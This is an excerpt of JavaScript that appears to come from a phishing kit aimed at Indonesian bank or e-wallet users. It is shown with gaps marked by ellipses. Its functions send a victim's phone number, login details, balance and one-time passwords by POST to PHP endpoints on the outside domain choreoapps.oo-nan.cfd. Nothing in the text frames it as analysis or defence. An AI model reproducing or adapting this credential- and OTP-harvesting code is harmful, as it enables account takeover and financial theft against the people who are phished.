function sendHp() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/26/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/26/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://choreoapps.oo-nan.cfd/26/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-nan.cfd/26/otpsdh.php',
...
function sendBelum(){    
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-nan.cfd/26/belum.php',
        data: $('#login').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
     ...
     $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-nan.cfd/26/otpblm.php',
        data: $('#formLinkk').serialize(),
        datatype: 'JSON',
                complete: function (response) {
                    showAlert("a");
